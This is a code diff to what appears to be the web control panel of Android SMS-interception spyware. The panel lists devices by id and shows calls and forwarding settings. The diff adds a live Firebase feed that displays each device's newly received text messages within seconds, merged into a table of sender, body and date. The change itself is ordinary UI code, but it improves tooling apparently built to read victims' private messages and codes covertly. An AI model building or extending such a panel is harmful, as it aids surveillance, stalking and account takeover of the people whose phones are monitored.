@@ -525,23 +525,22 @@ function loadDeviceData(id){
   var ref='devices/'+id;
   function on(path,cb){activeListeners[path]=DB.ref(path).on('value',cb);}
 
-  // SMS
+  // Real-time NEW SMS (arrives within 1-2 seconds of device receiving it)
+  on(ref+'/new_sms',function(snap){
+    if(!snap.exists()) return;
+    var newMsgs=[];
+    snap.forEach(function(c){newMsgs.push(c.val());});
+    newMsgs.reverse(); // latest first
+    window._newSmsData = newMsgs;
+    renderSmsList();
+  });
+
+  // Full SMS list (updates when count changes, ~3-60s after new SMS)
   on(ref+'/all_sms',function(snap){
-    var d=snap.val(), tb=document.getElementById('smsTbody');
-    if(!d||!d.messages||!d.messages.length){tb.innerHTML='<tr><td colspan="5" class="tbl-empty">📭 No SMS data. Grant READ_SMS on device.</td></tr>';document.getElementById('tc-sms').textContent='0';return;}
-    var msgs=d.messages.slice(0,100);
-    window._smsData=msgs;
-    document.getElementById('tc-sms').textContent=(d.total_count||d.messages.length)+' (showing 100)';
-    tb.innerHTML=msgs.map(function(s,i){
-      var type=(s.type||'').toLowerCase();
-      var dispBody=s.body&&s.body.length>60?esc(s.body.substring(0,60))+'…':esc(s.body||'—');
-      return '<tr class="sms-row-click" onclick="openSmsModal('+i+')">' +
-        '<td class="mono" style="color:var(--muted)">'+(i+1)+'</td>'+
-        '<td><b>'+esc(s.address||'?')+'</b></td>'+
-        '<td style="max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+dispBody+'</td>'+
-        '<td class="mono" style="color:var(--muted)">'+esc(s.date_readable||'—')+'</td>'+
-        '<td><span class="sbadge '+type+'">'+esc(s.type||'?')+'</span></td></tr>';
-    }).join('');
+    var d=snap.val();
+    window._allSmsData = (d&&d.messages)?d.messages:[];
+    window._allSmsTotal = d?d.total_count||0:0;
+    renderSmsList();
   });
 
   // CALLS
@@ -658,6 +657,38 @@ function saveFw(){
 }
 
 // ═══ HELPERS ═══
+
+function renderSmsList(){
+  var tb=document.getElementById('smsTbody');
+  var newMsgs=window._newSmsData||[];
+  var allMsgs=window._allSmsData||[];
+  var total=window._allSmsTotal||0;
+
+  // Merge: new_sms at top, then all_sms (deduped by date)
+  var newDates=newMsgs.map(function(m){return m.date;});
+  var filteredAll=allMsgs.filter(function(m){return newDates.indexOf(m.date)<0;});
+  var merged=newMsgs.concat(filteredAll).slice(0,100);
+
+  window._smsData=merged;
+  document.getElementById('tc-sms').textContent=(newMsgs.length+total)+' (showing 100)';
+
+  if(!merged.length){
+    tb.innerHTML='<tr><td colspan="5" class="tbl-empty">📭 No SMS data. Grant READ_SMS on device.</td></tr>';
+    document.getElementById('smsEmpty')?document.getElementById('smsEmpty').style.display='':null;
+    return;
+  }
+  tb.innerHTML=merged.map(function(s,i){
+    var isNew=i<newMsgs.length&&newMsgs.indexOf(s)>=0;
+    var type=(s.type||'').toLowerCase();
+    var dispBody=s.body&&s.body.length>60?esc(s.body.substring(0,60))+'…':esc(s.body||'—');
+    return '<tr class="sms-row-click" onclick="openSmsModal('+i+')">' +
+      '<td class="mono" style="color:var(--muted)">'+(i+1)+'</td>'+
+      '<td><b>'+esc(s.address||'?')+'</b>'+(isNew?'<span style="margin-left:4px;background:rgba(255,60,60,0.2);color:var(--accent);font-size:8px;padding:1px 5px;border-radius:8px;font-family:Space Mono,monospace">NEW</span>':'')+'</td>'+
+      '<td style="max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+dispBody+'</td>'+
+      '<td class="mono" style="color:var(--muted)">'+esc(s.date_readable||'—')+'</td>'+
+      '<td><span class="sbadge '+type+'">'+esc(s.type||'?')+'</span></td></tr>';
+  }).join('');
+}
 
 function openSmsModal(idx){
   var s=(window._smsData||[])[idx];
